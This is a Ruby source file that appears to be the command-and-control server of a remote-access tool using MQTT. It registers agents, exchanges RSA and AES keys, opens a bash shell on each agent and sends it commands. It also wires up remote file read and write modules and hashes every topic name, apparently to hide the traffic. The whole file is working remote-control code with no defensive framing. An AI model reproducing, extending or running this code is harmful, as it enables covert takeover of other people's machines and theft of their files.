require 'paho-mqtt'
require 'msgpacker'
require 'ostruct'
require 'securerandom'
require 'os'
require 'json'

require_relative 'core/encryption'
require_relative 'core/serialization'

require_relative 'inators/remoteshell'
require_relative 'inators/filerw'

Encryption::Digest.config({
	:digest => "md5"
})

Encryption::RSA.config({
  :key_size => 2048
})

mqtt_settings = {
	:host => 'localhost',
	:port => 1883,
	:persistent => true,
	:blocking => true,
	:reconnect_limit => 3,
	:reconnect_delay => 60
	#:will_topic => 'test',
	#:will_payload => 'test',
	#:will_qos => 2,
	#:will_retain => false
}

mqtt_topics = {
  :public_key						=> "/bu/public_key",
	:shinobi							=> "/bu/shinobi/+",
  :remoteshell					=> "/bu/shinobi/+/inators/remoteshell",
  :remoteshell_open			=> "/bu/shinobi/+/inators/remoteshell/cmds/open",
  :remoteshell_close		=> "/bu/shinobi/+/inators/remoteshell/cmds/close",
  :remoteshell_write		=> "/bu/shinobi/+/inators/remoteshell/cmds/write",
  :remoteshell_onopen		=> "/bu/shinobi/+/inators/remoteshell/events/open",
  :remoteshell_onclose	=> "/bu/shinobi/+/inators/remoteshell/events/close",
  :remoteshell_onread		=> "/bu/shinobi/+/inators/remoteshell/events/read",
  :remoteshell_onwrite	=> "/bu/shinobi/+/inators/remoteshell/events/write",
  :remoteshell_onerror	=> "/bu/shinobi/+/inators/remoteshell/events/error",
  :filerw								=> "/bu/shinobi/+/inators/filerw",
  :filerw_read					=> "/bu/shinobi/+/inators/filerw/cmds/read",
  :filerw_write					=> "/bu/shinobi/+/inators/filerw/cmds/write",
  :filerw_onread				=> "/bu/shinobi/+/inators/filerw/events/read",
  :filerw_onwrite				=> "/bu/shinobi/+/inators/filerw/events/write",
  :filerw_error					=> "/bu/shinobi/+/inators/filerw/events/error"
}

mqtt_topics.each do |key, value|
	levels = value.split('/')
	levels.each_with_index do |level, index|
		if level != '+' && level != '#' then
			levels[index] = Encryption::Digest.digest(level)
		end
	end
	mqtt_topics[key] = levels.join('/')
end

mqtt_client = PahoMqtt::Client.new(mqtt_settings)

mqtt_client.on_connack do
  mqtt_client.publish(mqtt_topics[:public_key], Encryption::RSA.public_key, false, 1)
  mqtt_client.subscribe([mqtt_topics[:shinobi], 2])
end

mqtt_client.add_topic_callback(mqtt_topics[:shinobi]) do |packet|
		topic = packet.topic.split('/')
		agent = topic[3]

	  packet = Encryption::RSA.decrypt(packet.payload)
	  packet = Serialization.deserialize(packet)

	  Encryption::AES.config({
	  	:key_lenght => 128,
	  	:mode => :CTR,
	  	:key => packet.aes["key"],
	  	:iv => packet.aes["iv"]
	  })

		payload = { :shell =>  'bash' }
		topic = mqtt_topics[:remoteshell_open].dup
		topic['+'] = agent

		payload = Serialization.serialize(payload)
		payload = Encryption::AES.encrypt(payload)

		puts topic

		mqtt_client.publish(topic, payload, false, 1)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_onopen]) do |packet|
	topic = packet.topic.split('/')
	agent = topic[3]

  packet = Encryption::AES.decrypt(packet.payload)
  packet = Serialization.deserialize(packet)
  puts packet

	payload = { :pid =>  packet.pid, :data => 'ping google.com' }
	topic = mqtt_topics[:remoteshell_write].dup
	topic['+'] = agent

	payload = Serialization.serialize(payload)
	payload = Encryption::AES.encrypt(payload)

	mqtt_client.publish(topic, payload, false, 1)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell]) do |packet|
  packet = Encryption::AES.decrypt(packet.payload)
  packet = Serialization.deserialize(packet)
  puts packet
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_onread]) do |packet|
  packet = Encryption::AES.decrypt(packet.payload)
  packet = Serialization.deserialize(packet)
  puts packet
end

mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)

mqtt_topics.each do |key, value|
	if value.include? Encryption::Digest.digest('events') then
		mqtt_client.subscribe([value, 2])
		sleep 0.1
	end
end

loop do
	mqtt_client.loop_read
	mqtt_client.loop_write
end
